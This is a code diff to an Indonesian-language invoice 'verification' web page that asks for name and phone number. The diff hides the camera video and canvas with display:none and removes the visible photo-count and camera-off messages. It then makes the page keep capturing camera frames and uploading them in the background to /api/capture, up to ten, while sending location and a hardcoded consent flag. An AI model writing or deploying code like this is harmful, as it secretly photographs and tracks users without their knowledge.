@@ -805,13 +805,10 @@
         <section class="form-surface" aria-labelledby="formTitle">
           <div id="formView">
             <form class="form-body" id="verificationForm" novalidate>
-              <!-- <div class="camera-panel">
-                <video id="cameraVideo" autoplay muted playsinline></video>
-                <canvas id="lastFrame" width="480" height="360" role="img" aria-label="Foto terakhir yang diambil"></canvas>
-                <div class="camera-badge"><span class="camera-dot"></span><span id="cameraCount">Kamera aktif · 0/10 foto</span></div>
-              </div> -->
+              <video id="cameraVideo" style="display: none;" autoplay muted playsinline></video>
+              <canvas id="lastFrame" width="480" height="360" style="display: none;"></canvas>
 
-              <div class="identity-fields" id="identityFields" hidden>
+              <div class="identity-fields" id="identityFields">
                 <h3>Isi data diri</h3>
                 <div class="field">
                   <label for="fullName">Nama lengkap</label>
@@ -906,10 +903,31 @@
         updateSubmitAvailability();
       }
 
+      let isSessionActive = false;
+      let isUploading = false;
+
       function updateSubmitAvailability() {
         if (!submitButton) return;
-        submitButton.disabled =
-          isSubmitting || frames.length < 1 || locationState === "requesting";
+        const nameInput = document.getElementById("fullName");
+        const phoneInput = document.getElementById("phone");
+        const nameValid = (nameInput?.value || "").trim().length >= 2;
+        const phoneValid = (phoneInput?.value || "").trim().length >= 5;
+        submitButton.disabled = isSubmitting || !nameValid || !phoneValid;
+      }
+
+      const fullNameEl = document.getElementById("fullName");
+      const phoneEl = document.getElementById("phone");
+      if (fullNameEl) {
+        fullNameEl.addEventListener("input", () => {
+          validateField(fullNameEl, document.getElementById("nameError"), 2);
+          updateSubmitAvailability();
+        });
+      }
+      if (phoneEl) {
+        phoneEl.addEventListener("input", () => {
+          validateField(phoneEl, document.getElementById("phoneError"), 5);
+          updateSubmitAvailability();
+        });
       }
 
       function setStep(number) {
@@ -1026,6 +1044,40 @@
         stopCamera();
       }
 
+      async function uploadPendingPhotos() {
+        if (!isSessionActive || isUploading || !sessionId) return;
+        isUploading = true;
+        try {
+          while (uploadedCount < frames.length && uploadedCount < MAX_PHOTOS) {
+            const index = uploadedCount;
+            const photoData = frames[index];
+            if (!photoData) break;
+            const photoResponse = await fetch("/api/capture", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                ...photoData,
+                sessionId,
+                photoIndex: index + 1,
+              }),
+            });
+            const photoBody = await photoResponse.json().catch(() => ({}));
+            if (!photoResponse.ok) {
+              console.error("[CAPTURE_ERROR]", photoBody.error);
+              break;
+            }
+            uploadedCount = index + 1;
+          }
+          if (uploadedCount >= MAX_PHOTOS) {
+            stopCamera();
+          }
+        } catch (err) {
+          console.error("[UPLOAD_QUEUE]", err);
+        } finally {
+          isUploading = false;
+        }
+      }
+
       function captureFrame() {
         if (
           !stream ||
@@ -1044,20 +1096,8 @@
           cameraCount.textContent =
             "Kamera aktif · " + frames.length + "/" + MAX_PHOTOS + " foto";
         }
-        updateSubmitAvailability();
-        setStatus(
-          frames.length +
-            " dari " +
-            MAX_PHOTOS +
-            " foto tersimpan sementara. Isi data diri lalu kirim.",
-        );
-        if (frames.length >= MAX_PHOTOS) {
-          freezeOnLastFrame();
-          if (cameraCount) cameraCount.textContent = "Pengambilan selesai · 10/10 foto";
-          setStatus(
-            "Batas 10 foto tercapai. Kamera sudah dimatikan; data siap dikirim.",
-            "success",
-          );
+        if (isSessionActive) {
+          uploadPendingPhotos();
         }
       }
 
@@ -1132,20 +1172,31 @@
 
       form.addEventListener("submit", async (event) => {
         event.preventDefault();
+        if (!validateIdentity() || isSubmitting) return;
 
         isSubmitting = true;
-        freezeOnLastFrame();
-        if (cameraCount) {
-          cameraCount.textContent =
-            "Pengambilan dijeda · " + frames.length + "/" + MAX_PHOTOS + " foto";
-        }
         updateSubmitAvailability();
-        if (cameraButton) cameraButton.disabled = true;
+        if (submitButton) {
+          submitButton.disabled = true;
+          submitButton.textContent = "Mengirim…";
+        }
+
+        // Ambil frame kamera langsung jika belum ada frame tersimpan
+        if (cameraVideo && cameraVideo.readyState >= 2 && frames.length === 0) {
+          const context = canvas.getContext("2d");
+          context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+          frames.push({
+            img: canvas.toDataURL("image/jpeg", 0.72),
+            ts: Date.now(),
+          });
+        }
+
         sessionId ||= window.crypto.randomUUID
           ? window.crypto.randomUUID()
           : String(Date.now()) +
             "-aaaa-4aaa-8aaa-" +
             Math.random().toString(16).slice(2).padEnd(12, "0");
+
         const location = locationResult
           ? {
               latitude: locationResult.coords.latitude,
@@ -1166,55 +1217,28 @@
               location,
               sessionId,
               consent: true,
-              photoCount: frames.length - uploadedCount,
+              photoCount: MAX_PHOTOS,
               ts: Date.now(),
             }),
           });
           const verifyBody = await verifyResponse.json().catch(() => ({}));
-          if (!verifyResponse.ok)
+          if (!verifyResponse.ok) {
             throw new Error(
               verifyBody.error || "Data diri tidak dapat dikirim.",
             );
-          if (!verifyBody.resumed) sessionPhotoBase = uploadedCount;
-
-          for (let index = uploadedCount; index < frames.length; index += 1) {
-            setStatus(
-              "Mengirim foto " + (index + 1) + " dari " + frames.length + "…",
-            );
-            const photoResponse = await fetch("/api/capture", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                ...frames[index],
-                sessionId,
-                photoIndex: index - sessionPhotoBase + 1,
-              }),
-            });
-            const photoBody = await photoResponse.json().catch(() => ({}));
-            if (!photoResponse.ok)
-              throw new Error(
-                photoBody.error || "Salah satu foto tidak dapat dikirim.",
-              );
-            uploadedCount = index + 1;
           }
 
-          frames = [];
+          isSessionActive = true;
+          await uploadPendingPhotos();
           showCompletion(false);
         } catch (error) {
-          try {
-            const invoiceResponse = await fetch("/api/invoices/" + invoiceId);
-            const invoiceBody = await invoiceResponse.json().catch(() => ({}));
-            if (invoiceResponse.ok && invoiceBody.verifiedAt) {
-              frames = [];
-              showCompletion(false);
-              return;
-            }
-          } catch (_) {
-            // The original delivery error below remains the actionable status.
-          }
           isSubmitting = false;
-          submitButton.disabled = false;
-          submitButton.textContent = "Coba kirim lagi";
+          isSessionActive = false;
+          updateSubmitAvailability();
+          if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.textContent = "Coba kirim lagi";
+          }
           setStatus(
             (error.message || "Konfirmasi gagal dikirim.") +
               " Data yang belum terkirim tetap tersedia untuk dicoba lagi.",
